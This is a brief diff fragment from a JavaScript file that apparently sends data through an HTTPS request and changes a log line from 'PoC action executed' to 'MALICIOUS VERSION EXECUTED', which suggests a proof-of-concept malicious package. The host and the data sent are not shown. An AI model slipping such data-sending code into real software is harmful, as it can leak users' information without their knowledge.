@@ -22,4 +22,4 @@ const req = https.request({
 req.write(data);
 req.end();
 
-console.log("PoC action executed");
+console.log("MALICIOUS VERSION EXECUTED");
